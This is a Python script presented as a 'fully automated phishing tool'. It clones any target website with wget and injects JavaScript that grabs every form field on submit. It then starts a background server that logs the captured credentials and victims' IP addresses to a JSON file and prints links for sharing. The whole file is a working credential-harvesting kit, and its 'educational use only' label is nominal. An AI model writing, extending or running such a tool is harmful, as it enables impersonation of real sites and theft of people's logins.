#!/usr/bin/env python3
"""
Fully Automated Phishing Tool
- Clone website
- Inject capture script
- Start server automatically
- Give final link

For Educational Use Only
"""

import os
import sys
import subprocess
import time
import socket
import threading
from pathlib import Path

def get_local_ip():
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "localhost"

def clone_website(url):
    """Clone website with wget"""
    print(f"\n🌐 Cloning {url}...")
    
    # Extract domain
    from urllib.parse import urlparse
    domain = urlparse(url).netloc.replace('.', '_')
    
    # Create output directory
    output_dir = Path.home() / "phishing_campaigns" / f"auto_{domain}_{int(time.time())}"
    output_dir.mkdir(parents=True, exist_ok=True)
    
    # Clone with wget
    cmd = f"""wget --mirror \
        --convert-links \
        --adjust-extension \
        --page-requisites \
        --no-parent \
        --random-wait \
        --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
        -P "{output_dir}" \
        "{url}" 2>&1"""
    
    try:
        subprocess.run(cmd, shell=True, timeout=300, capture_output=True)
        print("✅ Website cloned")
    except:
        print("⚠️  Cloning completed with warnings")
    
    return output_dir

def inject_capture(directory):
    """Inject credential capture into HTML files"""
    print("\n💉 Injecting credential capture...")
    
    capture_js = """
<script>
document.addEventListener('DOMContentLoaded', function() {
    // Capture all form submissions
    document.addEventListener('submit', function(e) {
        var form = e.target;
        var data = {};
        var inputs = form.querySelectorAll('input');
        
        inputs.forEach(function(input) {
            if(input.name) {
                data[input.name] = input.value;
            }
        });
        
        // Send to capture endpoint
        fetch('/capture', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        }).catch(function(err) {
            console.log('Capture endpoint unavailable');
        });
    });
    
    console.log('🎣 Phishing capture active');
});
</script>
"""
    
    # Find and inject into HTML files
    html_files = list(directory.rglob("*.html")) + list(directory.rglob("*.htm"))
    injected = 0
    
    for html_file in html_files:
        try:
            with open(html_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            if '</body>' in content.lower():
                content = content.replace('</body>', capture_js + '</body>', 1)
                with open(html_file, 'w', encoding='utf-8') as f:
                    f.write(content)
                injected += 1
        except:
            pass
    
    print(f"✅ Injected into {injected} files")
    return injected

def create_server(directory):
    """Create simple phishing server"""
    server_code = '''#!/usr/bin/env python3
from http.server import HTTPServer, SimpleHTTPRequestHandler
import json
import os
from datetime import datetime

class PhishingHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/capture':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data.decode('utf-8'))
                
                # Save credentials
                log_file = 'captured_credentials.json'
                
                if os.path.exists(log_file):
                    with open(log_file, 'r') as f:
                        logs = json.load(f)
                else:
                    logs = []
                
                logs.append({
                    'timestamp': datetime.now().isoformat(),
                    'ip': self.client_address[0],
                    'data': data
                })
                
                with open(log_file, 'w') as f:
                    json.dump(logs, f, indent=2)
                
                print(f"\\n🎣 CAPTURED from {self.client_address[0]}")
                print(json.dumps(data, indent=2))
            except:
                pass
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        pass  # Silent logging

if __name__ == '__main__':
    PORT = 8080
    print(f"\\n{'='*60}")
    print("  🎣 PHISHING SERVER ACTIVE")
    print(f"{'='*60}")
    print(f"  Port: {PORT}")
    print(f"  Credentials: captured_credentials.json")
    print(f"{'='*60}\\n")
    
    try:
        httpd = HTTPServer(('0.0.0.0', PORT), PhishingHandler)
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\\n[!] Server stopped")
'''
    
    server_file = directory / "server.py"
    with open(server_file, 'w') as f:
        f.write(server_code)
    server_file.chmod(0o755)
    
    return server_file

def start_server_background(directory, port=8080):
    """Start server in background"""
    os.chdir(directory)
    
    # Kill any existing server on this port
    try:
        subprocess.run(f"pkill -f 'server.py'", shell=True, stderr=subprocess.DEVNULL)
    except:
        pass
    
    # Start server in background
    subprocess.Popen(
        ["python3", "server.py"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        start_new_session=True
    )
    
    time.sleep(2)  # Wait for server to start

def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║          🎣 FULLY AUTOMATED PHISHING TOOL 🎣                 ║
║              Clone → Inject → Serve → Link                   ║
╚══════════════════════════════════════════════════════════════╝

⚠️  FOR EDUCATIONAL USE ONLY ⚠️
""")
    
    # Get target URL
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    else:
        target_url = input("\n🎯 Enter target URL: ").strip()
    
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url
    
    print(f"\n{'='*60}")
    print("  STARTING AUTOMATED PROCESS")
    print(f"{'='*60}")
    
    # Step 1: Clone website
    print("\n[1/5] Cloning website...")
    output_dir = clone_website(target_url)
    
    # Step 2: Inject capture script
    print("\n[2/5] Injecting capture script...")
    inject_capture(output_dir)
    
    # Step 3: Create server
    print("\n[3/5] Creating phishing server...")
    server_file = create_server(output_dir)
    
    # Step 4: Start server
    print("\n[4/5] Starting server in background...")
    port = 8080
    start_server_background(output_dir, port)
    
    # Step 5: Generate links
    print("\n[5/5] Generating access links...")
    local_ip = get_local_ip()
    
    print(f"\n{'='*60}")
    print("  ✅ PHISHING SITE READY!")
    print(f"{'='*60}")
    
    print(f"\n📱 SHARE THESE LINKS:\n")
    print(f"   Local Access:")
    print(f"   http://localhost:{port}\n")
    
    print(f"   Network Access (Same WiFi):")
    print(f"   http://{local_ip}:{port}\n")
    
    print(f"   📂 Files Location:")
    print(f"   {output_dir}\n")
    
    print(f"   📊 Captured Credentials:")
    print(f"   {output_dir}/captured_credentials.json\n")
    
    print(f"{'='*60}")
    print("  Server running in background")
    print("  Credentials will be saved automatically")
    print(f"{'='*60}\n")
    
    # Show how to view captures
    print("📋 To view captured credentials:")
    print(f"   cat {output_dir}/captured_credentials.json\n")
    
    print("🛑 To stop server:")
    print("   pkill -f server.py\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ Error: {e}")
        sys.exit(1)
